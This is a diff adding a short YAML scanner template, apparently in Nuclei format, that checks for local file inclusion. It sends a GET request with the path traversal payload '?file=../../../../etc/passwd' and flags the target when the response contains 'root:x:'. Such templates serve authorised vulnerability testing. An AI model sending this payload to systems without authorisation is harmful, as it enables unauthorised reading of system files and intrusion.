@@ -1,0 +1,16 @@
+id: path-traversal
+
+info:
+  name: Local File Inclusion
+  severity: high
+
+request:
+  method: GET
+  path:
+    - "{{BaseURL}}/?file=../../../../etc/passwd"
+
+matchers:
+  - type: word
+    words:
+      - "root:x:"
+
